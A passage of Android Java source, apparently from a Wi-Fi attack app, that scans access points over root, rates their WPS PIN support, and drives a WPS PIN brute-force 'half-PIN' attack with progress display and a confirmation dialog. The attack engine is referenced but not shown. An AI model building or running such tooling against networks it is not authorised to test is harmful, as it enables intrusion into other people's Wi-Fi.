                                                wpsScanBusy(true, L.s("读取每个 AP 的 WPS 能力…",
                                                        "reading per-AP capabilities…"));
                                            }
                                        });
                                    } else if (line.startsWith("PROGRESS=")) {
                                        final String p = line.substring(9).trim();
                                        runOnUiThread(() -> wpsScanBusy(true,
                                                L.s("读取能力 ", "capabilities ") + p.replace('_', '/')));
                                    } else if (line.startsWith("SCAN_OK=")) {
                                        // 2026-11-08：扫描失败（root 层）如实记录，不让
                                        // 完成回调用「扫描完成：0 个 AP」掩盖真相。
                                        if (!"1".equals(line.substring(8).trim())) {
                                            wpsTargetMgr.setError(L.s("扫描执行失败（supplicant/root 通道异常）",
                                                    "scan failed (supplicant/root channel error)"));
                                        }
                                    } else if (line.startsWith("ERROR=")) {
                                        if (wpsTargetMgr.lastError().isEmpty()) {
                                            wpsTargetMgr.setError(L.s("扫描异常：", "scan error: ")
                                                    + line.substring(6).trim());
                                        }
                                    }
                                }

                                @Override
                                public void onResult(io.github.wlmosv_png.wpaforge.wps.WpsController.Result r) {
                                }

                                @Override
                                public boolean isCancelled() {
                                    return false;
                                }
                            });
            runOnUiThread(() -> {
                wpsScanBusy(false, "");
                // 2026-11-08 扫描修复：终值不再清空流式积累的结果。
                // 老逻辑 clear()+addAll(list) 用 scan() 的终值覆盖流式 onLine 已收集的
                // 目标；若 run() 因超时被中断、终值解析不完整，会把扫描到的列表整表
                // 清空（表现为「扫完 0 个」）。改为增量合并去重：流式已收集的保留，
                // 漏掉的按 BSSID 补进。
                java.util.Map<String, io.github.wlmosv_png.wpaforge.wps.WpsController.Target> merged =
                        new java.util.LinkedHashMap<>();
                for (io.github.wlmosv_png.wpaforge.wps.WpsController.Target t : wpsTargetMgr.targets()) {
                    merged.put(t.bssid, t);
                }
                for (io.github.wlmosv_png.wpaforge.wps.WpsController.Target t : list) {
                    if (!merged.containsKey(t.bssid)) merged.put(t.bssid, t);
                }
                wpsTargetMgr.targets().clear();
                wpsTargetMgr.targets().addAll(merged.values());
                matchAllTargets();
                refreshVulnUi();
                renderWpsTargets();
                // 结论写进扫描状态行（列表现在含普通 AP + 未知能力 AP，措辞不再说
                // 「个支持 WPS 的目标」，改成如实报总数与未知数）
                int unk = 0;
                for (io.github.wlmosv_png.wpaforge.wps.WpsController.Target t : wpsTargetMgr.targets()) {
                    if (t.wpsVerdict == null
                            || "UNKNOWN".equals(t.wpsVerdict)
                            || "NO_WPS".equals(t.wpsVerdict)) unk++;
                }
                if (wpsScanStatus != null) {
                    // 2026-11-08：扫描失败或空结果时如实说明，不再用「0 个」掩盖根因。
                    if (wpsTargetMgr.targets().isEmpty()) {
                        if (!wpsTargetMgr.lastError().isEmpty()) {
                            wpsScanStatus.setText(wpsTargetMgr.lastError());
                        } else if (Boolean.FALSE.equals(wpsRootOk)) {
                            wpsScanStatus.setText(L.s("root 不可用：扫描无法通过特权通道执行，请检查 root 授权",
                                    "root unavailable: scanning needs the privileged channel, check root"));
                        } else {
                            // helper 没起 / 超时 / stderr 被吞：stdout 空且无 SCAN_OK=0。
                            // 最常见是 su 授权弹窗没点，或 app_process 引导失败。
                            wpsScanStatus.setText(L.s("扫描无返回：可能是 root 授权被拒或通道异常，请授予 root 后重试",
                                    "no scan output: root grant denied or channel error - grant root and retry"));
                        }
                        wpsScanStatus.setTextColor(DANGER);
                    } else {
                        wpsScanStatus.setText(L.s("扫描完成：", "Scan done: ") + wpsTargetMgr.targets().size()
                                + L.s(" 个 AP（", " APs (") + unk
                                + L.s(" 未检测到 WPS 信息）", " with no WPS info detected)"));
                        wpsScanStatus.setTextColor(TEXT);
                    }
                    wpsScanStatus.setVisibility(View.VISIBLE);
                }
                // 状态机收尾：有错误原因 → FAILED（不替换列表）；否则 → DONE（替换列表+计数）
                java.util.List<io.github.wlmosv_png.wpaforge.wps.WpsController.Target> snap =
                        new java.util.ArrayList<>(wpsTargetMgr.targets());
                if (!wpsTargetMgr.lastError().isEmpty()) {
                    wpsTargetMgr.failScan(wpsTargetMgr.lastError());
                } else {
                    wpsTargetMgr.finishScan(snap, snap.size(), snap.size() - unk);
                }
                renderWpsTargets();
                refreshWpsPickedMeta();
            });
        }, "wps-scan").start();
    }

    /** 状态总览卡：执行环境 + 能力状态。数据全部来自真实来源；未知显「信息不足」。 */
    /** 2026-11-08：刷新顶部目标卡的信号/频段/扫描时间。数据全部来自选中目标与
     * 扫描时间戳；wpsPickedMeta 为空（页未建）时直接跳过。 */
    /**
     * 刷新顶部目标卡（SSID / BSSID / 信号·时间 / 能力标签）。
     *
     * <p>2026-11-09 UI 整改：这是「扫描完成仍显示待检测」的根治点。原实现只刷新一行
     * 元信息，SSID / BSSID / 能力标签都是建页时写死 —— 选了目标也不更新。
     * 现在四行统一由本方法刷新，并被选中目标、扫描完成、清空目标三处调用。
     */
    private void refreshWpsPickedMeta() {
        if (wpsPickedMeta == null) return;
        boolean zh = L.s("a", "b").equals("a");
        if (wpsTargetMgr.selected() == null) {
            if (wpsTargetSsidV != null) {
                wpsTargetSsidV.setText(L.s("（未选择目标）", "(no target)"));
                wpsTargetSsidV.setTextColor(TEXT);
            }
            if (wpsTargetBssidV != null) {
                wpsTargetBssidV.setText(L.s("--:--:--:--:--:--", "--:--:--:--:--:--"));
            }
            wpsPickedMeta.setText(L.s("信号 -- dBm · 最近扫描：--",
                    "rssi -- dBm · last scan: --"));
            setWpsCapTag(WPS_TAG_NONE);
            return;
        }
        if (wpsTargetSsidV != null) {
            wpsTargetSsidV.setText(wpsTargetMgr.selected().ssid == null || wpsTargetMgr.selected().ssid.isEmpty()
                    ? L.s("（隐藏 SSID）", "(hidden SSID)") : wpsTargetMgr.selected().ssid);
            wpsTargetSsidV.setTextColor(TEXT);
        }
        if (wpsTargetBssidV != null) {
            wpsTargetBssidV.setText(wpsTargetMgr.selected().bssid
                    + (wpsTargetMgr.selected().freq > 0 ? "   " + wpsTargetMgr.selected().freq + " MHz" : ""));
        }
        String when = wpsLastScanNote();
        wpsPickedMeta.setText(L.s("信号 ", "rssi ") + wpsTargetMgr.selected().rssi + " dBm"
                + L.s(" · 最近扫描：", " · last scan: ") + when);
        setWpsCapTag(wpsCapStateOf(wpsTargetMgr.selected()));
    }

    // ---- 能力标签状态（区分「能力未知」与「已确认不支持」，不再一律叫「待检测」）----
    private static final int WPS_TAG_NONE = 0;        // 未选择目标
    private static final int WPS_TAG_UNKNOWN = 1;     // 未检测到 WPS 信息 / 能力未知
    private static final int WPS_TAG_OK = 2;          // 声明可接受 PIN
    private static final int WPS_TAG_NO_PIN = 3;      // 声明不收外部 PIN
    private static final int WPS_TAG_LOCKED = 4;      // AP 已锁定

    /**
     * 由目标的能力判定结果映射到标签状态（取真实字段，不臆测）。
     *
     * <p>2026-11-09 架构升级：结论 → 状态 的映射收敛到 {@link WpsUiKit}（可离线单测），
     * 本方法只做「kit 状态 → 本地视觉常量」的适配。
     */
    private int wpsCapStateOf(io.github.wlmosv_png.wpaforge.wps.WpsController.Target t) {
        if (t == null) return WPS_TAG_NONE;
        // 2026-11-09（P0-1）：标签**只认能力管理器的结论**（由 config_methods 实际取值决定）。
        // 修复前直接把 t.wpsVerdict 字符串映射成标签 —— 于是 "NO_WPS"（读不到）
        // 会被当成"明确不支持"，且与运行时双通道结论互相矛盾。
        io.github.wlmosv_png.wpaforge.wps.WpsCapabilityManager.Capability cap =
                wpsCapByBssid.get(t.bssid);
        if (cap == null) {
            // 尚未运行时检测：用扫描期的 config_methods 组通道 A，只作"临时结论"
            io.github.wlmosv_png.wpaforge.wps.WpsCapabilityManager.Channel a =
                    io.github.wlmosv_png.wpaforge.wps.WpsCapabilityManager.root(
                            t.bssid, wpsParseConfigMethods(t.wpsMethods),
                            -1, -1, -1, t.wpsDevice, "", System.currentTimeMillis());
            cap = io.github.wlmosv_png.wpaforge.wps.WpsCapabilityManager
                    .combine(t.bssid, System.currentTimeMillis(), a, null);
        }
        return wpsUiStateOf(cap.verdict);
    }

    /** 设能力标签（颜色/文案随状态；未知≠不支持，如实区分）。 */
    private void setWpsCapTag(int state) {
        switch (state) {
            case WPS_TAG_OK: wpsLastCapVerdict =
                    io.github.wlmosv_png.wpaforge.wps.WpsCapabilityManager.V_PIN_OK; break;
            case WPS_TAG_NO_PIN: wpsLastCapVerdict =
                    io.github.wlmosv_png.wpaforge.wps.WpsCapabilityManager.V_NO_PIN; break;
            case WPS_TAG_LOCKED: wpsLastCapVerdict =
                    io.github.wlmosv_png.wpaforge.wps.WpsCapabilityManager.V_LOCKED; break;
            default: wpsLastCapVerdict =
                    io.github.wlmosv_png.wpaforge.wps.WpsCapabilityManager.V_UNKNOWN; break;
        }
        if (wpsCapTag == null) return;
        String txt;
        int fg;
        switch (state) {
            case WPS_TAG_OK:
                txt = L.s("声明可接受 PIN", "declares PIN support");
                fg = AmberTheme.OK;
                break;
            case WPS_TAG_NO_PIN:
                txt = L.s("不收外部 PIN", "no external PIN");
                fg = DANGER;
                break;
            case WPS_TAG_LOCKED:
                txt = L.s("AP 已锁定", "AP locked");
                fg = DANGER;
                break;
            case WPS_TAG_UNKNOWN:
                txt = L.s("能力未知", "capability unknown");
                fg = AmberTheme.TEXT_DIM;
                break;
            default:
                txt = L.s("未选择", "no target");
                fg = AmberTheme.TEXT_DIM;
                break;
        }
        wpsCapTag.setText(txt);
        wpsCapTag.setTextColor(fg);
        wpsCapTag.setBackground(roundBgStroked(
                state == WPS_TAG_OK ? AmberTheme.OK_BG : AmberTheme.NEUTRAL_BG, fg, 14, 0.8f));
    }

    /** 最近一次扫描的相对时间文案；没扫过返回「--」并如实说明。 */
    private String wpsLastScanNote() {
        if (wpsTargetMgr.lastScanAt() <= 0) return "--";
        long sec = (System.currentTimeMillis() - wpsTargetMgr.lastScanAt()) / 1000;
        if (sec < 60) return sec + L.s(" 秒前", "s ago");
        if (sec < 3600) return (sec / 60) + L.s(" 分钟前", "min ago");
        return (sec / 3600) + L.s(" 小时前", "h ago");
    }

    private void renderWpsSummary() {
        if (wpsSummaryCard == null) return;
        final boolean zh = L.s("a", "b").equals("a");
        StringBuilder cap = new StringBuilder();
        StringBuilder env = new StringBuilder();

        io.github.wlmosv_png.wpaforge.wps.WpsController.Target tg = wpsTargetMgr.selected();
        cap.append(L.s("目标：", "Target: "));
        cap.append(tg == null ? L.s("未选择\n", "none\n")
                : tg.ssid + "  " + tg.bssid + "\n");
        if (tg == null) {
            cap.append(L.s("  WPS 支持    信息不足\n", "  WPS    unknown\n"));
            cap.append(L.s("  PIN 方法    信息不足\n", "  PIN    unknown\n"));
            cap.append(L.s("  外部 Registrar  信息不足\n", "  extReg unknown\n"));
        } else {
            String wpsSt = tg.wpsVerdict == null ? "" : tg.wpsVerdict;
            String wpsTxt;
            switch (wpsSt) {
                case "PIN_OK": wpsTxt = L.s("已确认支持 PIN 方法", "PIN method supported"); break;
                case "NO_PIN": wpsTxt = L.s("未声明 PIN 输入方法", "no PIN method declared"); break;
                case "LOCKED": wpsTxt = L.s("AP 已锁定", "AP locked"); break;
                default: wpsTxt = L.s("信息不足", "unknown"); break;
            }
            cap.append(L.s("  WPS 支持     ", "  WPS    ")).append(wpsTxt).append('\n');
            cap.append(L.s("  PIN 方法     ", "  PIN    "));
            if (!"NO_PIN".equals(wpsSt) && !"LOCKED".equals(wpsSt) && !"UNKNOWN".equals(wpsSt)) {
                cap.append(L.s("已确认支持（config=", "supported (config="))
                        .append(tg.wpsMethods).append(')').append('\n');
            } else if ("NO_PIN".equals(wpsSt)) {
                cap.append(L.s("未声明（config=", "not declared (config="))
                        .append(tg.wpsMethods).append(')').append('\n');
            } else {
                cap.append(L.s("信息不足", "unknown")).append('\n');
            }
            cap.append(L.s("  外部 Registrar  ", "  extRegistrar  "));
            if (tg.pairingWindow == 1) cap.append(L.s("存在可能（配对待机已开）", "possible (pairing open)"));
            else if (tg.pairingWindow == 0) cap.append(L.s("信息不足（配对待机未开）", "likely closed"));
            else cap.append(L.s("信息不足（AP 未宣告）", "unknown (not declared)"));
            cap.append('\n');
        }

        // 2026-11-08 卡顿修复：Root 可用性不再在主线程同步 exec su。
        // 老代码每次 buildWpsTab 首建都在这跑 2 次 WpsController.available()
        // （=2 次同步 su -c app_process status），首建 WPS 页共 4 次 root exec，
        // 点击 WPS 导航明显卡顿。现在主线程只读缓存：null 显示「检测中」，
        // 真实检测放后台线程（ensureWpsRootDiag），跑完再刷这一行。
        Boolean rootOk = wpsRootOk;
        env.append(L.s("Root    ", "Root    ")).append(
                rootOk == null
                        ? L.s("检测中…", "checking…")
                        : (rootOk ? L.s("可用", "OK") : L.s("不可用", "unavailable"))).append('\n');
        if (rootOk == null) ensureWpsRootDiag();
        String ch = wpsSelftestDone
                ? io.github.wlmosv_png.wpaforge.wps.WpsChannelDiag.CHANNEL_OK
                : io.github.wlmosv_png.wpaforge.wps.WpsChannelDiag.NOT_SELF_TESTED;
        env.append(L.s("supplicant 通道  ", "channel  "))
                .append(io.github.wlmosv_png.wpaforge.wps.WpsChannelDiag.channelLabel(ch, zh))
                .append('\n');
        env.append(L.s("SELinux   ", "SELinux   ")).append(
                rootOk == null
                        ? L.s("（由 helper 执行时确认）", "(confirmed at runtime)")
                        : (rootOk ? L.s("策略已就绪", "policy ok")
                                  : L.s("不可用", "unavailable"))).append('\n');
        env.append(wpsSelftestDone
                ? L.s("通道已真读回包验证", "channel verified by real read")
                : L.s("通道自检未执行（开始/扫描后自动检查）", "channel not self-tested yet"));

        wpsEnvCardText.setText(env.toString());
        wpsCapCardText.setText(cap.toString());
    }

    /** 2026-11-08：后台线程检测 root 可用性，只在缓存为空时跑一次。 */
    private void ensureWpsRootDiag() {
        if (wpsRootOk != null) return;
        if (wpsRootDiagStarted) return;
        wpsRootDiagStarted = true;
        new Thread(() -> {
            try {
                boolean ok = io.github.wlmosv_png.wpaforge.wps.WpsController.available(this);
                wpsRootOk = ok;
                runOnUiThread(this::renderWpsSummary);
            } catch (Throwable ignored) {
            }
        }, "wps-root-diag").start();
    }

    /** 异步真读一次 supplicant 回包做通道自检（只读，不发 WPS 命令）。 */
    private void wpsRunSelftest() {
        if (wpsSelftestStarted) return;
        wpsSelftestStarted = true;
        new Thread(() -> {
            try {
                io.github.wlmosv_png.wpaforge.wps.WpsController.status(this);
                wpsSelftestDone = true;
                runOnUiThread(this::renderWpsSummary);
            } catch (Throwable ignored) {
            }
        }, "wps-selftest").start();
    }

    private void renderWpsTargets() {
        wpsTargetList.removeAllViews();
        if (wpsTaskMgr().isRunning()) {
            TextView run = new TextView(this);
            run.setText(L.s("任务运行中 —— 按「暂停」后可更换目标",
                    "Task running - press Pause to change target"));
            run.setTextSize(AmberTheme.FS_SMALL);
            run.setTextColor(ACCENT);
            run.setPadding(px(4), 0, px(4), px(8));
            wpsTargetList.addView(run);
        }
        if (wpsTargetMgr.targets().isEmpty()) {
            TextView t = new TextView(this);
            // 2026-11-09 架构升级：空态文案由 WpsFacade 依状态机决定，UI 不再自行推断
            //（"扫描完成仍显示待检测"这类错位从此不可能由 UI 拼错导致）。
            io.github.wlmosv_png.wpaforge.wps.WpsFacade.UiState uis = wpsFacadeState();
            boolean zhUi = L.s("a", "b").equals("a");
            String hint = zhUi ? uis.emptyHintZh : uis.emptyHintEn;
            t.setText(hint == null || hint.isEmpty()
                    ? L.s("未发现附近网络", "No nearby networks found") : hint);
            t.setTextSize(AmberTheme.FS_BODY);
            t.setTextColor(TEXT_DIM);
            t.setPadding(px(4), px(10), px(4), px(10));
            wpsTargetList.addView(t);
            return;
        }
        final boolean zh = L.s("a", "b").equals("a");
        for (io.github.wlmosv_png.wpaforge.wps.WpsController.Target tg : wpsTargetMgr.targets()) {
            // 每个目标一张**行卡**：名称一行、地址一行、能力/体检一行，右侧信号与状态胶囊。
            // 原来是一个塞了四行居中文字的大按钮（用户反馈"显示的内容很拉胯"）。
            boolean on = wpsTargetMgr.selected() != null && tg.bssid.equals(wpsTargetMgr.selected().bssid);
            boolean worth = tg.pinWorthTrying();

            LinearLayout item = new LinearLayout(this);
            item.setOrientation(LinearLayout.HORIZONTAL);
            item.setBackground(roundBgStroked(on ? AmberTheme.ACCENT_BG : AmberTheme.CARD,
                    on ? ACCENT : AmberTheme.EDGE, AmberTheme.RADIUS_CARD, on ? 1.2f : 0.8f));
            item.setPadding(px(14), px(12), px(12), px(12));
            LinearLayout.LayoutParams ilp = new LinearLayout.LayoutParams(
                    ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
            ilp.bottomMargin = px(8);
            item.setLayoutParams(ilp);
            if (wpsTaskMgr().isRunning()) item.setAlpha(0.6f);

            LinearLayout left = new LinearLayout(this);
            left.setOrientation(LinearLayout.VERTICAL);

            TextView ssid = new TextView(this);
            ssid.setText(tg.ssid);
            ssid.setTextSize(AmberTheme.FS_TITLE);
            ssid.setTextColor(on ? ACCENT : TEXT);
            ssid.setTypeface(Typeface.create("sans-serif-medium", Typeface.NORMAL));
            ssid.setSingleLine(true);
            ssid.setEllipsize(TextUtils.TruncateAt.END);
            left.addView(ssid);

            TextView addr = new TextView(this);
            addr.setText(tg.bssid + "   " + tg.freq + " MHz");
            addr.setTextSize(FS_TINY);
            addr.setTextColor(AmberTheme.TEXT_DIM);
            addr.setTypeface(Typeface.MONOSPACE);
            addr.setSingleLine(true);
            LinearLayout.LayoutParams al2 = new LinearLayout.LayoutParams(
                    ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
            al2.topMargin = px(4);
            left.addView(addr, al2);

            StringBuilder cap = new StringBuilder();
            cap.append("[").append(tg.capLabel(zh)).append("]");
            String rl = tg.reconLabel(zh);
            if (!rl.isEmpty()) {
                cap.append("  ").append(rl);
                if (!tg.reconDetail.isEmpty()) cap.append("  ").append(tg.reconDetail);
            }
            if (!tg.wpsMethods.isEmpty()) cap.append("  ").append(tg.wpsMethods);
            if (!tg.wpsDevice.isEmpty()) cap.append("  · ").append(tg.wpsDevice);
            String vdet = io.github.wlmosv_png.wpaforge.wps.VulnUi.detail(tg.vuln, zh);
            if (!vdet.isEmpty()) cap.append("  ★ ").append(vdet);

            TextView caps = new TextView(this);
            caps.setText(cap.toString());
            caps.setTextSize(FS_TINY);
            caps.setTextColor(worth ? AmberTheme.TEXT_DIM : DANGER);
            caps.setTypeface(Typeface.MONOSPACE);
            caps.setSingleLine(false);
            caps.setMaxLines(3);
            LinearLayout.LayoutParams clp2 = new LinearLayout.LayoutParams(
                    ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
            clp2.topMargin = px(3);
            left.addView(caps, clp2);

            item.addView(left, new LinearLayout.LayoutParams(0,
                    ViewGroup.LayoutParams.WRAP_CONTENT, 1f));

            LinearLayout right = new LinearLayout(this);
            right.setOrientation(LinearLayout.VERTICAL);
            right.setGravity(Gravity.END);
            right.setMinimumWidth(px(70));

            TextView dbm = new TextView(this);
            dbm.setText(tg.rssi + " dBm");
            dbm.setTextSize(AmberTheme.FS_BODY);
            dbm.setTextColor(AmberTheme.signalColor(levelOfRssi(tg.rssi)));
            dbm.setTypeface(Typeface.MONOSPACE);
            dbm.setGravity(Gravity.END);
            dbm.setSingleLine(true);
            right.addView(dbm);

            TextView chip = new TextView(this);
            chip.setText(on ? L.s("已选", "selected")
                    : (worth ? L.s("可试", "worth trying") : L.s("不建议", "not advised")));
            chip.setTextSize(FS_TINY);
            chip.setTextColor(on ? AmberTheme.ON_ACCENT : (worth ? AmberTheme.TEXT_DIM : DANGER));
            chip.setGravity(Gravity.CENTER);
            chip.setBackground(roundBg(on ? ACCENT : (worth ? AmberTheme.CARD_3
                    : AmberTheme.DANGER_SOFT_BG), AmberTheme.RADIUS_CHIP));
            chip.setPadding(px(8), px(3), px(8), px(3));
            LinearLayout.LayoutParams chlp = new LinearLayout.LayoutParams(
                    ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT);
            chlp.topMargin = px(6);
            right.addView(chip, chlp);

            // 名单命中：单独一枚标记，不改动原来那枚「可试/不建议」的语义
            String vshort = tg.vulnShort(zh);
            if (!vshort.isEmpty()) {
                TextView vchip = new TextView(this);
                vchip.setText(vshort);
                vchip.setTextSize(FS_TINY);
                vchip.setTextColor(AmberTheme.ACCENT_SOFT);
                vchip.setGravity(Gravity.CENTER);
                vchip.setBackground(roundBg(AmberTheme.ACCENT_BG, AmberTheme.RADIUS_CHIP));
                vchip.setPadding(px(8), px(3), px(8), px(3));
                LinearLayout.LayoutParams vclp = new LinearLayout.LayoutParams(
                        ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT);
                vclp.topMargin = px(6);
                right.addView(vchip, vclp);
            }

            item.addView(right);
            item.setOnClickListener(v -> {
                if (wpsTaskMgr().isRunning()) {
                    Toast.makeText(this, L.s("任务运行中，请先暂停再换目标",
                            "Task running - pause first"), Toast.LENGTH_SHORT).show();
                    return;
                }
                wpsTargetMgr.select(tg);
                wpsWarnedBssid = null;      // 换了目标，警告重新计
                // 选中信息由顶部目标卡（ssidV + wpsPickedMeta）展示，不再用死字段
                refreshWpsPickedMeta();
                refreshWpsButtons();
                renderWpsTargets();
            });
            wpsTargetList.addView(item);
        }
        // 默认选第一个，省一次点击
        if (wpsTargetMgr.selected() == null && !wpsTargetMgr.targets().isEmpty()) {
            wpsTargetMgr.select(wpsTargetMgr.targets().get(0));
            refreshWpsPickedMeta();
            renderWpsTargets();
        }
    }

    private void refreshWpsProgress() {
        io.github.wlmosv_png.wpaforge.wps.WpsEngine.Session s = wpsSession;
        if (s == null) {
            wpsStatusLine.setText(L.s("待开始", "Idle"));
            wpsProgressLine.setText("");
            return;
        }
        boolean zh = L.s("a", "b").equals("a");
        // 状态行：当前结论 + 命中 PIN（命中才会显示已命中）
        String verdictTxt = io.github.wlmosv_png.wpaforge.wps.WpsEngine.verdictText(s.verdict, zh);
        if (io.github.wlmosv_png.wpaforge.wps.WpsEngine.V_HIT.equals(s.verdict)
                && s.hitPin != null) {
            // 命中也不伪装成「破解成功」：附可信等级（多数情况只有待验证）
            String lvl = io.github.wlmosv_png.wpaforge.wps.WpsHitJudge.levelField(s);
            wpsStatusLine.setText(verdictTxt + "  PIN=" + s.hitPin
                    + "  · 可信等级：" + io.github.wlmosv_png.wpaforge.wps.WpsHitJudge
                            .levelText(lvl, zh));
        } else {
            wpsStatusLine.setText(verdictTxt);
        }

        StringBuilder sb = new StringBuilder();
        // 「AP 能力声明」与「命中」是两件不同的事：前者是 AP 自报的 WSC 能力，
        // 后者才是协议确认的命中。始终分开显示，避免把“能力”读成“打下来了”。
        if (s.precheckMethods != null && !s.precheckMethods.isEmpty()) {
            sb.append(L.s("AP 能力声明：", "AP capability: ")).append(s.precheck)
                    .append(' ').append(s.precheckMethods)
                    .append(L.s("（≠命中）\n", " (not a hit)\n"));
        }
        // —— 结果分类（区分已确认/待验证/异常，不合并）——
        sb.append(L.s("已确认结果：", "Confirmed: "));
        if (io.github.wlmosv_png.wpaforge.wps.WpsEngine.V_HIT.equals(s.verdict)) {
            sb.append(L.s("1 条（见状态行）\n", "1 (see status line)\n"));
        } else {
            sb.append(L.s("0\n", "0\n"));
        }
        sb.append(L.s("待验证（疑似命中）：", "Pending (suspect): "))
                .append(s.suspectCount).append(L.s(" 条\n", "\n"));
        sb.append(L.s("异常 / 他网连接：", "Abnormal / other-net: "))
                .append(s.notTargetCount).append(L.s(" 条\n", "\n"));
        // —— 进度（以实际完成数为准）——
        if (wpsMode == 3) {
            int total = io.github.wlmosv_png.wpaforge.wps.WpsCandidates.phaseTotal(s.halfPhase);
            sb.append(L.s("已完成：", "Done: ")).append(s.halfCursor)
                    .append(L.s(" / ", " / ")).append(total)
                    .append(L.s(" 阶段 ", " phase ")).append(s.halfPhase);
            if (s.halfPhase == 2 && s.halfPrefix != null && !s.halfPrefix.isEmpty()) {
                sb.append(L.s("  前4位=", "  prefix=")).append(s.halfPrefix);
            }
            double rate = io.github.wlmosv_png.wpaforge.wps.WpsEngine.ratePerMin(s);
            sb.append(L.s("\n平均 ", "\navg ")).append(s.avgMs()).append("ms");
            int remain = Math.max(0, total - s.halfCursor);
            sb.append(L.s("  剩余约 ", "  eta "))
                    .append(io.github.wlmosv_png.wpaforge.wps.WpsEngine
                            .human((long) (s.avgMs() * remain)));
        } else {
            sb.append(L.s("已试：", "Tried: ")).append(s.tried).append(L.s(" 条", ""));
            double rate = io.github.wlmosv_png.wpaforge.wps.WpsEngine.ratePerMin(s);
            if (rate > 0) {
                sb.append(L.s("  ", "  "))
                        .append(String.format(java.util.Locale.US, "%.1f", rate))
                        .append(L.s(" 条/分", " /min"));
            }
            sb.append(L.s("  平均 ", "  avg ")).append(s.avgMs()).append("ms");
        }
        // —— 最近一次 ————
        if (s.lastPin != null && !s.lastPin.isEmpty()) {
            sb.append(L.s("\n最近：", "\nlast: ")).append(s.lastPin)
                    .append(' ').append(s.lastResult == null || s.lastResult.isEmpty()
                            ? "?" : s.lastResult);
        }
        sb.append(L.s("\n最近更新：", "\nupdated: "))
                .append(android.text.format.DateFormat.format("HH:mm:ss",
                        System.currentTimeMillis()));
        if (io.github.wlmosv_png.wpaforge.wps.WpsEngine.V_HIT.equals(s.verdict)
                && s.hitVerdict != null && !s.hitVerdict.isEmpty()) {
            sb.append('\n')
                    .append(io.github.wlmosv_png.wpaforge.wps.WpsEngine.evidenceSummary(s));
        }
        wpsProgressLine.setText(sb.toString());
        // 状态总览卡跟着进度刷新；首次进入页面异步做一次通道自检
        renderWpsSummary();
        wpsRunSelftest();
    }

    /** 拆半长任务已在本次会话确认过（避免每次点开始都弹）。 */
    private boolean wpsHalfConfirmedOnce;

    private void startWps() {
        if (wpsTaskMgr().isRunning()) return;
        if (wpsTargetMgr.selected() == null) {
            // 用户反馈的「想继续却每次都弹提示」就是这句话：盘上有断点、
            // 但目标列表是内存对象（重启即空），于是每次点「继续」都被拦。
            // 现在把「断点属于谁、现在还缺什么」一并说清楚。
            String hint = wpsResumeSummary(false);
            Toast.makeText(this, hint.isEmpty()
                            ? L.s("请先扫描并选择目标", "Scan and pick a target first")
                            : hint,
                    Toast.LENGTH_LONG).show();
            return;
        }
        // 扫描阶段已经问出这个 AP 不收 PIN / 被锁：先拦一次，再点才放行。
        // 以前没有这一步，用户要白等 8 次 × 20 秒才知道打不动。
        if (!wpsTargetMgr.selected().pinWorthTrying() && !wpsTargetMgr.selected().bssid.equals(wpsWarnedBssid)) {
            wpsWarnedBssid = wpsTargetMgr.selected().bssid;
            Toast.makeText(this, L.s(
                    "该 AP 不会接受外部 PIN（" + wpsTargetMgr.selected().capLabel(true)
                            + (wpsTargetMgr.selected().wpsMethods.isEmpty() ? "" : "，" + wpsTargetMgr.selected().wpsMethods)
                            + "）。\n跑下去基本不可能命中；再点一次「开始」仍然强制运行。",
                    "This AP does not accept an external PIN (" + wpsTargetMgr.selected().capLabel(false)
                            + (wpsTargetMgr.selected().wpsMethods.isEmpty() ? "" : ", " + wpsTargetMgr.selected().wpsMethods)
                            + ").\nVery unlikely to hit; tap Start again to force."),
                    Toast.LENGTH_LONG).show();
            return;
        }
        // ---- 拆半长任务门槛：仅拆半模式需要（11000 次、以十小时计、可能触发 AP 锁定） ----
        if (wpsMode == 3 && !wpsHalfConfirmedOnce) {
            wpsConfirmHalfStart();
            return;               // 确认框回调里真正启动
        }
        doStartWps();
    }

    /** 真正启动（拆半确认通过后 / 非拆半直接走这里）。 */
    private void doStartWps() {
        wpsTaskMgr().beginRun();
        wpsCancel = false;
        wpsLogMgr.clear();
        wpsSession = new io.github.wlmosv_png.wpaforge.wps.WpsEngine.Session();
        // 台账：开新任务（新任务不覆盖旧任务；命中记录永久保留）
        wpsTaskStart(wpsTargetMgr.selected().bssid, wpsTargetSsidForMatch(), wpsMode);
        refreshWpsButtons();
        renderWpsTargets();
        renderWpsModeList();
        refreshWpsProgress();
        final String bssid = wpsTargetMgr.selected().bssid;
        new Thread(() -> runWpsAttack(bssid), "wps-attack").start();
    }

    /**
     * 拆半长任务确认框：明示成本与风险，把「长时间运行、可能触发 AP 锁定」
     * 作为操作门槛，而不是让用户误点开始后挂一宿。
     */
    private void wpsConfirmHalfStart() {
        String cost;
        double per = 8.0;   // 单次尝试 7~9s，取 8s 作为保守下限
        double hours = 11000.0 * per / 3600.0;
        cost = String.format(java.util.Locale.US, "%.0f~%.0f", hours * 0.9, hours * 1.4);
        io.github.wlmosv_png.wpaforge.ui.NetDialog halfDlg = new io.github.wlmosv_png.wpaforge.ui.NetDialog(this,
                L.s("启动拆半攻击？", "Start half-PIN attack?"),
                L.s(
                        "拆半攻击：依次穷举前 4 位（10000 次）与后 3 位（1000 次），覆盖合法 8 位 PIN 的取值空间。\n\n"
                                + "· 预计耗时：约 " + cost + " 小时（单次尝试 7~9 秒，未计退避/中断）\n"
                                + "· 风险：可能触发 AP 的 WPS 锁定 / 限流，届时需等待或重启路由器\n"
                                + "· 中断可随时停止，进度会存档并在下次「继续」\n"
                                + "· 本机会话证据有限：即使命中，可信等级通常只到「待验证」\n"
                                + "· 不保证成功\n\n"
                                + "确认运行？",
                        "Half-PIN: try 1st-4th digits (10k) then last 3 (1k), covering the "
                                + "valid 8-digit space.\n\n"
                                + "· Est. " + cost + "h (7-9s/try, ignoring backoff)\n"
                                + "· Risk: may trip AP WPS lock/limit\n"
                                + "· Stop anytime; progress saved for Resume\n"
                                + "· Evidence here is limited; hits usually cap at 'pending'\n"
                                + "· No success guarantee\n\n"
                                + "Run?"));
        halfDlg.setPositive(L.s("运行拆半", "Run"), nd -> {
            wpsHalfConfirmedOnce = true;
            doStartWps();
        });
